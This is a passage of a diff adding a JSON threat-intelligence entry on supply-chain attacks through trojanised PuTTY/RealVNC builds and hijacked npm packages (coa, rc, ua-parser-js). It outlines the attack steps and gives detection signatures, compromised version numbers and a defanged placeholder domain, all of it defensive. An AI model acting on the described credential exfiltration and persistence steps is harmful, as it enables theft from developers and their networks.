+                    "action": "Victim is socially engineered to download and execute a modified open source tool (e.g., PuTTY/RealVNC) or install a hijacked npm package (coa, rc, ua-parser-js) from npm.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Initial compromise of the victim's machine or development environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code establishes persistence (via service installation) and/or exfiltrates sensitive data (credentials, environment variables) to attacker infrastructure.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains remote access or obtains sensitive information for further exploitation."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker uses established access or stolen credentials to move laterally, deploy additional malware, or target secondary victims within the network or supply chain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Broader network compromise, data infiltration, and potential supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unexpected installation of persistent services or processes by PuTTY or RealVNC executables",
+                    "Outbound network connections from PuTTY, RealVNC, or npm package processes to untrusted or attacker-controlled domains/IPs",
+                    "Access and exfiltration of environment variables or credential files by npm package entrypoints",
+                    "Presence of obfuscated or minified code in npm package entrypoints (index.js)"
+                  ],
+                  "file_indicators": [
+                    "Modified PuTTY or RealVNC executables with non-standard hashes (not matching official releases)",
+                    "Obfuscated or minified JavaScript in index.js of coa@2.0.3, 2.0.4, 2.1.1; rc@1.2.9; ua-parser-js@0.7.29, 0.8.0, 1.0.0",
+                    "Creation of new Windows service or executable in system directories after running PuTTY/RealVNC"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP POST requests from npm package processes to attacker-controlled domains (as listed in the report, e.g., 'api[.]examplemalicious[.]com')",
+                    "Outbound connections from PuTTY/RealVNC processes to IPs/domains not associated with official tool infrastructure"
+                  ],
+                  "how_to_detect": "Monitor for new persistent services or executables created by PuTTY or RealVNC processes. Use file integrity monitoring to detect modified binaries with hashes differing from official releases. Scan npm package entrypoints for obfuscated or minified code and monitor for network requests to untrusted domains during or after package installation. Alert on access to sensitive environment variables or credential files by non-privileged or unexpected processes. Correlate outbound network activity with known attacker infrastructure."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
